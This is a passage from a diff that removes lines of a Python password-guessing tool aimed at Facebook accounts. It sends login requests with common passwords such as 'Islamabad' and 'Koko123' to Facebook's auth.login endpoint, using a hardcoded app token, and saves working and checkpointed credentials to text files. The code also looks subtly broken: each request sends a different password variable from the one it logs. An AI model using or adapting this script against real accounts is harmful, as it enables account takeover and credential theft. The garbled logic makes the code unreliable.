-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass29 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass30+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass30+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass30+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass31= "Peshawar"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass30 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass31+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass31+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass31+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass32= "Islamabad"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass31 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass32+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass32+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass32+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-								else:
-		                                                    pass33= "Koko123"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass32 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("- "+uid+" | "+pass33+" --> CP")
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass33+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m- \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass33+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-														
+															
 		except:
 			pass
 		
